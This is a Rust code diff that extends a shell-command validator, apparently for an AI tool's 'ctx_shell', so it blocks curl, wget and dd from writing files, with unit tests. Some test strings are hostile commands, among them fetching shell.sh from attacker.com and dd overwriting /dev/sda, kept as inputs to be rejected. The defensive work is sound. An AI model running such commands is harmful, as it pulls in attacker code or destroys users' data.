@@ -46,6 +46,77 @@ pub fn validate_command(command: &str) -> Option<String> {
         );
     }
 
+    if let Some(reason) = download_to_file_reason(command) {
+        return Some(format!(
+            "ERROR: ctx_shell detected a file download/write ({reason}). \
+             ctx_shell is ONLY for reading command output — redirect-free flags bypass \
+             this doctrine, so they are blocked too (GH #391). \
+             Fetch to stdout instead (curl <url>, wget -qO- <url>) or use the editor's \
+             native tools to create files."
+        ));
+    }
+
+    None
+}
+
+/// Detects download/copy tools writing directly to files via their own flags
+/// (`curl -o`, `wget` default mode, `dd of=`) — the redirect-free equivalent of
+/// `> file`, reported as a `validate_command` bypass in GH #391.
+fn download_to_file_reason(command: &str) -> Option<String> {
+    for seg in crate::core::shell_allowlist::extract_all_commands_pub(command) {
+        let tokens = crate::core::shell_allowlist::shell_tokenize(seg.trim());
+        let Some(first) = tokens.first() else {
+            continue;
+        };
+        let base = first.rsplit('/').next().unwrap_or(first);
+        match base {
+            "curl" => {
+                for tok in &tokens[1..] {
+                    if tok == "--output"
+                        || tok.starts_with("--output=")
+                        || tok == "--remote-name"
+                        || tok == "--remote-name-all"
+                        || tok == "--output-dir"
+                        || tok.starts_with("--output-dir=")
+                    {
+                        return Some(format!("curl {tok}"));
+                    }
+                    // Short flags cluster: -o / -O anywhere in e.g. `-fsSLo`.
+                    if tok.starts_with('-')
+                        && !tok.starts_with("--")
+                        && tok[1..].contains(['o', 'O'])
+                    {
+                        return Some(format!("curl {tok}"));
+                    }
+                }
+            }
+            "wget" => {
+                // wget writes a file BY DEFAULT; only stdout/no-download modes pass.
+                let to_stdout = tokens[1..].iter().enumerate().any(|(i, tok)| {
+                    tok == "--output-document=-"
+                        || tok == "-O-"
+                        || (tok.starts_with('-') && !tok.starts_with("--") && tok.ends_with("O-"))
+                        || ((tok == "-O" || tok == "--output-document")
+                            && tokens.get(i + 2).map(std::string::String::as_str) == Some("-"))
+                        || tok == "--spider"
+                });
+                if !to_stdout {
+                    return Some(
+                        "wget downloads to a file by default; use wget -qO- <url> for stdout"
+                            .to_string(),
+                    );
+                }
+            }
+            "dd" => {
+                for tok in &tokens[1..] {
+                    if tok.starts_with("of=") && !tok.starts_with("of=/dev/null") {
+                        return Some(format!("dd {tok}"));
+                    }
+                }
+            }
+            _ => {}
+        }
+    }
     None
 }
 
@@ -293,6 +364,55 @@ mod tests {
     #[test]
     fn validate_allows_cat_without_redirect() {
         assert!(validate_command("cat file.txt").is_none());
+    }
+
+    // --- GH #391: download tools writing files without shell redirects ---
+
+    #[test]
+    fn validate_blocks_curl_output_flags() {
+        assert!(validate_command("curl -o /tmp/shell.sh http://attacker.com/shell.sh").is_some());
+        assert!(validate_command("curl -fsSLo /tmp/x https://example.com").is_some());
+        assert!(validate_command("curl --output evil.bin https://example.com").is_some());
+        assert!(validate_command("curl --output=evil.bin https://example.com").is_some());
+        assert!(validate_command("curl -O https://example.com/payload").is_some());
+        assert!(validate_command("git fetch && curl -o x.sh https://e.com").is_some());
+    }
+
+    #[test]
+    fn validate_allows_curl_to_stdout() {
+        assert!(validate_command("curl https://api.example.com/health").is_none());
+        assert!(validate_command("curl -fsSL https://example.com | head -5").is_none());
+        assert!(validate_command("curl -s -X POST https://api.example.com -d '{}'").is_none());
+        // -H takes a value; no o/O short flag involved.
+        assert!(validate_command("curl -H \"Accept: application/json\" https://e.com").is_none());
+    }
+
+    #[test]
+    fn validate_blocks_wget_default_file_download() {
+        assert!(validate_command("wget http://attacker.com/shell.sh").is_some());
+        assert!(validate_command("wget -q https://example.com/file.tar.gz").is_some());
+        assert!(validate_command("wget -O /tmp/out https://example.com").is_some());
+    }
+
+    #[test]
+    fn validate_allows_wget_stdout_and_spider() {
+        assert!(validate_command("wget -qO- https://example.com").is_none());
+        assert!(validate_command("wget -O- https://example.com").is_none());
+        assert!(validate_command("wget -O - https://example.com").is_none());
+        assert!(validate_command("wget --output-document=- https://example.com").is_none());
+        assert!(validate_command("wget --spider https://example.com").is_none());
+    }
+
+    #[test]
+    fn validate_blocks_dd_output_file() {
+        assert!(validate_command("dd if=/dev/zero of=/tmp/fill bs=1M count=10").is_some());
+        assert!(validate_command("dd if=image.iso of=/dev/sda").is_some());
+    }
+
+    #[test]
+    fn validate_allows_dd_read_only() {
+        assert!(validate_command("dd if=/dev/urandom bs=16 count=1 status=none").is_none());
+        assert!(validate_command("dd if=file.bin of=/dev/null bs=1M").is_none());
     }
 
     // --- Auth flow detection: strong signals (no URL needed) ---
